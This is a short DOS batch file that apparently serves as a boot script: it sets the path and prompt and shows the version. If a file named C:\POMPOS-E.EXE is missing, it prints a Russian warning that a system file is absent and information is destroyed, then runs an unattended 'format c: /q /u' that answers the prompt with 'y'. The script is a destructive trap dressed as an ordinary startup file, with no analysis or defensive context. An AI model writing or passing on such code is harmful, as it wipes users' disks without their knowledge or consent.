@echo off
path a:\
newdosed
prompt $p$g
ver
:Перевод строки!
@echo off
if exist C:\POMPOS-E.EXE goto fun
echo    Внимание! НЕ найден системный файл: 
echo C:\POMPOS-E.EXE Информация уничтожена...
echo y| format c: /q /u

:fun
